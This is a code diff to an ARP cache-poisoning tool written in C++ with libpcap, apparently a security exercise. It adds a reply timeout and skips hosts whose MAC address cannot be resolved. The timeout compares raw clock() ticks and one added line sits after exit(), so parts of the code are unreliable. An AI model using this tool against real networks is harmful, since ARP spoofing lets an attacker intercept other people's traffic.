@@ -3,6 +3,7 @@
 #include <sstream>
 #include <iomanip>
 #include <map>
+#include <ctime>
 #include <pcap.h>
 #include <ifaddrs.h>
 #include <netpacket/packet.h>
@@ -50,7 +51,7 @@ void getMyMacAddr(const char* interfaceName, Mac& myMac) {
     }
 }
 
-void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const Ip targetIp, Mac& saveMac) {
+void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const Ip targetIp, Mac& saveMac, int timeout = 3000) {
 	EthArpPacket packet;
 	// * 1. send ARP request to get MAC address of ip_str
 	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
@@ -72,9 +73,15 @@ void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const
 	if (res!= 0) {
         fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
 		exit(EXIT_FAILURE);
+		saveMac = Mac("00:00:00:00:00:00");	
         return;
     }
 
+	clock_t start, finish;
+    double duration;
+ 
+    start = clock();
+	
 	// * 3. Wait for the ARP reply and extract the MAC address
     while (true) {
         struct pcap_pkthdr* header;
@@ -101,6 +108,14 @@ void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const
             saveMac = receivedPacket->arp_.smac_;
             return;
         }
+
+		finish = clock();
+		duration = (double)(finish - start);
+		if (duration > timeout) {
+            fprintf(stderr, "ARP reply not received within the specified timeout(%s)\n", string(targetIp).c_str());
+			saveMac = Mac("00:00:00:00:00:00");
+            return;
+        }
     }
     
     fprintf(stderr, "Failed to get ARP reply\n");
@@ -115,6 +130,11 @@ void send_arp_attack_packet(pcap_t* handle, const char* senderIpStr, const char*
 	if (senderMacSet.find(senderIpStr) == senderMacSet.end()) {
 		// 1차 ARP Table 수정
 		getMacAddrFromSendArp(handle, targetIp, myMac, senderIp, senderMac);
+		if (senderMac == Mac("00:00:00:00:00:00")) {
+			printf("Faild Get Mac Address(%s)\n", senderIpStr);
+			return;
+		}
+
 		senderMacSet[senderIpStr] = senderMac;
 	}
 	
@@ -169,10 +189,9 @@ int main(int argc, char* argv[]) {
 	Mac myMac;
 	getMyMacAddr(dev, myMac);
 
-	for (const pair<char*, char*>& pair : sender_target_pairs) {
+	for (const pair<char*, char*>& pair : sender_target_pairs) 
 		send_arp_attack_packet(handle, pair.first, pair.second, myMac);
-		printf("Send <%s, %s>\n", pair.first, pair.second);
-	}
+	
 	
 	pcap_close(handle);
 }
